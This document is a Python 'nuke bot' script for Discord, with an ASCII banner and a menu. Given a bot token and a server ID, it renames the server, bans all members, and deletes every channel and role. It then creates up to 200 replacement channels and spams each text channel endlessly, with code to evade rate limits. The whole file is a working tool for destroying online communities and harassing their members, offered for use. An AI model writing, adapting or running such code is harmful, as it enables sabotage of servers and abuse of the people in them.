import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio
import random

init()

# Defining colors for better visibility
dr = DR = r = R = cc.RED
g = G = G = cc.GREEN
b = B = B = cc.BLUE
m = M = M = cc.MAGENTA
c = C = C = cc.CYAN
y = Y = Y = cc.YELLOW
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text): print(text, end=''); return input()

baner = f'''
{g}███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██████╗  ██████╗ ████████╗
{g}████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
{g}██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██████╔╝██║   ██║   ██║   
{g}██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██╔══██╗██║   ██║   ██║   
{g}██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝   ██║   
{g}╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   '''

async def delete_all_channels(guild):
    deleted = 0
    tasks = [channel.delete() for channel in guild.channels]
    for task in asyncio.as_completed(tasks):
        try:
            await task
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    tasks = [role.delete() for role in guild.roles]
    for task in asyncio.as_completed(tasks):
        try:
            await task
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    tasks = [member.ban() for member in guild.members]
    for task in asyncio.as_completed(tasks):
        try:
            await task
            banned += 1
        except:
            continue
    return banned

async def create_roles(guild, name):
    created = 0
    tasks = [guild.create_role(name=name) for _ in range(200 - len(guild.roles))]
    for task in asyncio.as_completed(tasks):
        try:
            await task
            created += 1
        except:
            continue
    return created

async def create_text_channels(guild, name):
    created = 0
    tasks = [guild.create_text_channel(name=name) for _ in range(200 - len(guild.channels))]
    for task in asyncio.as_completed(tasks):
        try:
            await task
            created += 1
        except:
            continue
    return created

async def spam_text_channels(guild, message):
    tasks = []
    for channel in guild.text_channels:
        tasks.append(spam_channel(channel, message))
    await asyncio.gather(*tasks)

async def spam_channel(channel, message):
    message_count = 0
    while True:
        try:
            await channel.send(message)
            message_count += 1
            await asyncio.sleep(random.uniform(1, 3))  # Add a random delay to prevent rate limiting
            if message_count % 1000 == 0:
                print(f'{g}Sent {message_count} messages. Pausing to prevent rate limiting.')
                await asyncio.sleep(30)  # Pause for 30 seconds after every 1000 messages
        except discord.errors.HTTPException as e:
            if e.code == 429:  # Rate limited
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
                print(f'{r}Rate limited. Retrying after {retry_after} seconds.')
                await asyncio.sleep(retry_after)
            else:
                print(f'{r}Failed to send message in {channel.name}: {e}')
                await asyncio.sleep(5)  # Wait longer before retrying on failure

async def change_server_name(guild, new_name):
    try:
        await guild.edit(name=new_name)
        print(f'{g}Server name changed to {new_name}')
    except discord.HTTPException as e:
        print(f'{r}Failed to change server name: {e}')

async def nuke_guild(guild, new_server_name, name, message):
    print(f'{r}Nuke: {m}{guild.name}')
    await change_server_name(guild, new_server_name)
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channels(guild)
    print(f'{m}Delete Channels:{b}{deleted_channels}')
    deleted_roles = await delete_all_roles(guild)
    print(f'{m}Delete Roles:{b}{deleted_roles}')
    created_channels = await create_text_channels(guild, name)
    print(f'{m}Create Text Channels:{b}{created_channels}')
    await spam_text_channels(guild, message)
    print(f'{r}--------------------------------------------\n\n')

while True:
    clear()
    choice = input(f'''
{baner}
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{c}====> {g}''')
    if choice == '1':
        token = _input(f'{y}Your Bot token: {g}')
        new_server_name = _input(f'{y}New server name: {g}')
        name = _input(f'{y}Channels Name: {g}')
        message = _input(f'{y}Message to spam in channels: {g}')
        clear()
        choice_type = _input(f'''
{baner}
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke a server
    {y}└─[2] {m}- {g}Exit
{c}====> {g}''')
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        if choice_type == '1':
            guild_id = _input(f'{y}Server ID: {g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild, new_server_name, name, message)
                await client.close()
        elif choice_type == '2':
            print(f'{r}Exit...')
            exit()
        try:
            client.run(token)
            input('Nuke finished, press enter to return to menu...')
        except Exception as error:
            if str(error) == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter to return...')
            else:
                input(f'{r}{error}\n{b}Press enter to return...')
            continue
    elif choice == '2':
        print(f'{r}Exit...')
        exit()
